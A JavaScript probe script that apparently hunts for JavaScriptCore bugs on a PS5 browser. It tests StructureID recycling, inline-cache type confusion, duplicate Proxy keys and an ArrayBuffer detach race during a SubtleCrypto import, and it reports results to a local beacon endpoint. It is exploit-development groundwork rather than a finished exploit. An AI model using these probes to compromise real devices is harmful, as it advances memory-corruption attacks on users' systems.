/*
 * p423 -- StructureID recycling / LLInt IC type confusion
 *
 * Theory: JSC recycles StructureIDs. The LLInt caches structureID + offset
 * for get_by_id. If we can make a new object get a recycled structureID
 * that was previously used for a different layout, the IC reads the wrong
 * property offset = type confusion.
 *
 * Approach:
 * 1. Create many objects with unique structures (different property sets)
 * 2. Delete them to free their StructureIDs
 * 3. Create new objects with different layouts
 * 4. Check if old IC entries read wrong offsets
 *
 * Also: test how many unique structures PS5 can handle before recycling.
 *
 * Beacon prefix: V423-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V423-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: Structure exhaustion -- how many unique structures?
// ================================================================

function testA() {
  B("A-START");

  var count = 0;
  var objs = [];
  var MAX = 100000;

  try {
    for (var i = 0; i < MAX; i++) {
      var o = {};
      // Each object gets a unique property name -> unique Structure
      o["prop_" + i] = i;
      objs.push(o);
      count++;

      if (count % 10000 === 0) {
        B("A-PROGRESS", count);
      }
    }
  } catch(e) {
    B("A-ERR", {count: count, err: e.message.slice(0, 60)});
  }

  B("A-COUNT", count);

  // Now free them all
  objs = null;

  // Force GC
  for (var i = 0; i < 10; i++) {
    var tmp = new ArrayBuffer(1024 * 1024);
    tmp = null;
  }

  B("A-FREED");
  return count;
}

// ================================================================
// Test B: IC confusion via structure transition
// ================================================================

function testB() {
  B("B-START");

  // Create a function that accesses obj.x via get_by_id
  // The LLInt will cache the structureID + offset after first call
  function readX(obj) {
    return obj.x;
  }

  function readY(obj) {
    return obj.y;
  }

  // Phase 1: Train the IC with object layout A
  // Layout A: { x: <number>, y: <number> }
  var objA = { x: 0x41414141, y: 0x42424242 };

  // Call readX many times to warm up IC
  var warmup = 0;
  for (var i = 0; i < 100; i++) {
    warmup = readX(objA);
  }
  B("B-WARMUP", warmup);

  // Phase 2: Create object layout B with same property names
  // but different property ORDER -> different structure -> different offsets
  var objB = {};
  objB.y = 0xDEADBEEF; // y first
  objB.x = 0xCAFEBABE; // x second (different offset than in objA)

  // Read objB.x through the IC that was trained on objA
  var result = readX(objB);
  var resultY = readY(objB);

  B("B-RESULT", {
    readX_objB: result,
    readY_objB: resultY,
    expected_x: 0xCAFEBABE,
    expected_y: 0xDEADBEEF,
    confused: (result !== 0xCAFEBABE) ? "YES" : "NO"
  });

  // Phase 3: Try with delete + re-add to force transition
  var objC = { x: 111, y: 222, z: 333 };
  delete objC.y; // Changes structure
  objC.y = 444;  // Re-adds y at potentially different offset

  var resultC = readX(objC);
  B("B-DELETE", {
    readX: resultC,
    expected: 111,
    confused: (resultC !== 111) ? "YES" : "NO"
  });
}

// ================================================================
// Test C: Proxy + for-in duplicate keys
// ================================================================

function testC() {
  B("C-START");

  var target = { a: 1, b: 2, c: 3 };
  var accessLog = [];
  var callCount = 0;

  var handler = {
    ownKeys: function() {
      // Return duplicate key "a"
      return ["a", "b", "a"];
    },
    getOwnPropertyDescriptor: function(t, key) {
      callCount++;
      accessLog.push({call: callCount, key: key});

      // On second access to "a", modify the target
      if (key === "a" && callCount > 2) {
        // Add many properties to force structure change
        for (var i = 0; i < 20; i++) {
          target["extra_" + i] = i;
        }
      }

      return {value: t[key], writable: true, enumerable: true, configurable: true};
    }
  };

  var proxy = new Proxy(target, handler);

  var keys = [];
  var values = [];
  try {
    for (var k in proxy) {
      keys.push(k);
      values.push(proxy[k]);
    }
  } catch(e) {
    B("C-ERR", e.message.slice(0, 60));
  }

  B("C-KEYS", keys);
  B("C-VALS", values);
  B("C-CALLS", callCount);
  B("C-DUP-ACCEPTED", keys.filter(function(k) { return k === "a"; }).length > 1 ? "YES" : "NO");
}

// ================================================================
// Test D: StructureID table info -- what's the max ID?
// ================================================================

function testD() {
  B("D-START");

  // Create objects with unique structures and check if we can detect
  // when structures start getting recycled
  var structures = [];
  var BATCH = 1000;
  var ROUNDS = 50;

  for (var r = 0; r < ROUNDS; r++) {
    // Create batch
    var batch = [];
    for (var i = 0; i < BATCH; i++) {
      var o = {};
      o["r" + r + "_p" + i] = true;
      batch.push(o);
    }
    structures.push(batch);

    // Every 10 rounds, free old batches
    if (r > 0 && r % 10 === 0) {
      for (var j = 0; j < r - 5; j++) {
        structures[j] = null;
      }
      // GC pressure
      var tmp = new ArrayBuffer(4 * 1024 * 1024);
      tmp = null;
    }
  }

  B("D-DONE", {rounds: ROUNDS, batch: BATCH, total: ROUNDS * BATCH});
}

// ================================================================
// Test E: SubtleCrypto + detach race
// ================================================================

function testE() {
  B("E-START");

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0x41;

  // Start an async crypto operation
  var keyPromise = crypto.subtle.importKey(
    "raw", ab, {name: "HMAC", hash: "SHA-256"}, false, ["sign"]
  );

  // Immediately transfer the buffer
  var transferred = false;
  try {
    structuredClone(ab, {transfer: [ab]});
    transferred = true;
  } catch(e) {
    B("E-TRANSFER-ERR", e.message.slice(0, 60));
  }

  B("E-TRANSFERRED", transferred);

  // Check if crypto operation still works on freed data
  keyPromise.then(function(key) {
    B("E-KEY-OK", "crypto succeeded after transfer");

    // Try to sign with the key
    var data = new Uint8Array([1,2,3,4]);
    return crypto.subtle.sign("HMAC", key, data);
  }).then(function(sig) {
    B("E-SIGN-OK", new Uint8Array(sig).length);
  }).catch(function(e) {
    B("E-CRYPTO-ERR", e.message.slice(0, 60));
  });
}

testA();
testB();
testC();
testD();
testE();

// Give crypto time
setTimeout(function() { B("DONE"); }, 2000);
})();
